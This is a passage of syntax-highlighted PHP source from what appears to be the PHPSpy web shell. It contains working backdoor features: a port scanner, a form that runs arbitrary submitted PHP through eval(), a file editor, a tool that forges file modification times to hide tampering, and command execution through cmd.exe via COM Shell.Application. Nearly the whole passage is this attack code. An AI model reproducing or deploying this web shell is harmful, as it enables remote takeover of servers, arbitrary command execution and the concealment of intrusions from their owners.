<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">scanip</span> &amp;&amp; $<span style="color: #ffeead;">scanip</span> = <span style="color: #99ffff;">'127.0.0.1'</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">scanport</span> &amp;&amp; $<span style="color: #ffeead;">scanport</span> = <span style="color: #99ffff;">'21,25,80,110,135,139,445,1433,3306,3389,5631,4395</span><span style="color: #99ffff; text-decoration: underline;">8'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Port Scan'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'portscan'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'IP:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'scanip'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">20</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">scanip</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'Port:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'scanport'</span>,<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">80</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">scanport</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'startscan'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #99ffff;">'Scan'</span>,<span style="color: #99ffff;">'type'</span>=&gt;<span style="color: #99ffff;">'submit'</span>,<span style="color: #99ffff;">'class'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #99ffff; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">startscan</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>(<span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">','</span>, $<span style="color: #ffeead;">scanport</span>) <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">port</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fp</span> = @<span style="color: #ffffff; background-color: #002451;">fsockopen(</span>$<span style="color: #ffeead;">scanip</span>, $<span style="color: #ffeead;">port</span>, &amp;$<span style="color: #ffeead;">errno</span>, &amp;$<span style="color: #ffeead;">errstr</span>, <span style="color: #ffffff; background-color: #002451;">1</span>);<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">fp</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;li&gt;'</span>.$<span style="color: #ffeead;">scanip</span>.<span style="color: #99ffff;">':'</span>.$<span style="color: #ffeead;">port</span>.<span style="color: #99ffff;">' ------------------------ &lt;span styl</span><span style="color: #99ffff; text-decoration: underline;">e="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>  } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;li&gt;'</span>.$<span style="color: #ffeead;">scanip</span>.<span style="color: #99ffff;">':'</span>.$<span style="color: #ffeead;">port</span>.<span style="color: #99ffff;">' ------------------------ &lt;span styl</span><span style="color: #99ffff; text-decoration: underline;">e="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>  }<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/ul&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'eval'</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">phpcode</span> = <span style="color: #ffffff; background-color: #002451;">trim(</span>$<span style="color: #ffeead;">phpcode</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">phpcode</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ffffff; background-color: #002451;">preg_match(</span><span style="color: #99ffff;">'#&lt;\?#si'</span>, $<span style="color: #ffeead;">phpcode</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">phpcode</span> = <span style="color: #99ffff;">"&lt;?php\n\n{$phpcode}\n\n?&gt;"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">eval(</span><span style="color: #99ffff;">"?"</span>.<span style="color: #99ffff;">"&gt;$phpcode&lt;?"</span>);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=<span style="color: #bbdaff;">&gt;</span><span style="color: #99ffff;">'Eval PHP Code'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'eval'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">maketext(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'PHP Code'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'phpcode'</span>, <span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">phpcode</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;&lt;a href="http://w'</span>.<span style="color: #99ffff;">'ww.4ng'</span>.<span style="color: #99ffff;">'el.net/php'</span>.<span style="color: #99ffff;">'spy/pl'</span>.<span style="color: #99ffff;">'ugin/" target="_bla</span><span style="color: #99ffff; text-decoration: underline;">nk"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfooter(</span>);
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end eval</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'editfile'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">opfile</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fp</span>=@<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">opfile</span>,<span style="color: #99ffff;">'r'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">contents</span>=@<span style="color: #ffffff; background-color: #002451;">fread(</span>$<span style="color: #ffeead;">fp</span>, <span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">opfile</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">contents</span>=<span style="color: #ffffff; background-color: #002451;">htmlspecialchars(</span>$<span style="color: #ffeead;">contents</span>);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Create / Edit File'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'file'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Current File (import new file name and new file)'</span>,<span style="color: #99ffff; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #99ffff; text-decoration: underline;">'editfilename'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffeead; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">maketext(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'File Content'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'filecontent'</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">conte</span><span style="color: #ffeead; text-decoration: underline;">nts</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfooter(</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">goback(</span>);

}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end editfile</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'newtime'</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">opfilemtime</span> = @<span style="color: #ffffff; background-color: #002451;">filemtime(</span>$<span style="color: #ffeead;">opfile</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">$time = strtotime("$year-$month-$day $hour:$minute:$second");</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">cachemonth</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'January'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">1</span>,<span style="color: #99ffff;">'February'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">2</span>,<span style="color: #99ffff;">'March'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">3</span>,<span style="color: #99ffff;">'April'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">4</span>,<span style="color: #99ffff;">'May'</span>=&gt;<span style="color: #ffffff; background-color: #002451; text-decoration: underline;">5</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'June'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">6</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'July'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">7</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'August'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">8</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'September'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">9</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'October'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">10</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'November'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">11</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'December'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">12</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Clone folder/file was last modified time'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'file'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Alter folder/file'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'curfile'</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">opf</span><span style="color: #ffeead; text-decoration: underline;">ile</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Reference folder/file (fullpath)'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'tarfile</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfooter(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Set last modified'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'file'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Current folder/file (fullpath)'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'curfile'</span>,<span style="color: #99ffff; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffeead; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;year:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'year'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">date(</span><span style="color: #99ffff;">'Y'</span>,$<span style="color: #ffeead;">opfilemtime</span>),<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">4</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'month:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'month'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">date(</span><span style="color: #99ffff;">'m'</span>,$<span style="color: #ffeead;">opfilemtime</span>),<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">2</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'day:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'day'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">date(</span><span style="color: #99ffff;">'d'</span>,$<span style="color: #ffeead;">opfilemtime</span>),<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">2</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'hour:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'hour'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">date(</span><span style="color: #99ffff;">'H'</span>,$<span style="color: #ffeead;">opfilemtime</span>),<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">2</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'minute:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'minute'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">date(</span><span style="color: #99ffff;">'i'</span>,$<span style="color: #ffeead;">opfilemtime</span>),<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'second:'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'second'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">date(</span><span style="color: #99ffff;">'s'</span>,$<span style="color: #ffeead;">opfilemtime</span>),<span style="color: #99ffff;">'size'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfooter(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">goback(</span>);
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end newtime</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'shell'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #ff9da4; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">program</span> &amp;&amp; $<span style="color: #ffeead;">parameter</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">shell</span>= <span style="color: #d1f1a9;">new</span> <span style="color: #bbdaff;">COM</span>(<span style="color: #99ffff;">'Shell.Application'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">a</span> = $<span style="color: #ffeead;">shell</span>-&gt;<span style="color: #ffffff; background-color: #002451;">ShellExecute</span>($<span style="color: #ffeead;">program</span>,$<span style="color: #ffeead;">parameter</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Program run has '</span>.(!$<span style="color: #ffeead;">a</span> ? <span style="color: #99ffff;">'success'</span> : <span style="color: #99ffff;">'fail'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">program</span> &amp;&amp; $<span style="color: #ffeead;">program</span> = <span style="color: #99ffff;">'c:\windows\system32\cmd.exe'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">parameter</span> &amp;&amp; $<span style="color: #ffeead;">parameter</span> = <span style="color: #99ffff;">'/c net start &gt; '</span>.<span style="color: #ff9da4; font-weight: bold;">SA_ROOT</span>.<span style="color: #99ffff;">'log.txt'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Execute Program'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'shell'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Program'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'program'</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">program</span>,<span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Parameter'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'parameter'</span>,<span style="color: #99ffff;">'value'</span>=&gt;$<span style="color: #ffeead;">param</span><span style="color: #ffeead; text-decoration: underline;">eter</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'submit'</span>,<span style="color: #99ffff;">'class'</span>=&gt;<span style="color: #99ffff;">'bt'</span>,<span style="color: #99ffff;">'type'</span>=&gt;<span style="color: #99ffff;">'submit'</span>,<span style="color: #99ffff;">'value'</span>=<span style="text-decoration: underline;">&gt;</span><span style="color: #99ffff; text-decoration: underline;">'Execute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Execute Command'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'shell'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #ff9da4; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">execfuncdb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'phpfunc'</span>=&gt;<span style="color: #99ffff;">'phpfunc'</span>,<span style="color: #99ffff;">'wscript'</span>=&gt;<span style="color: #99ffff;">'wscript'</span>,<span style="color: #99ffff;">'proc_open</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #99ffff; text-decoration: underline;">'proc_open'</span><span style="text-decoration: underline;">);</span>
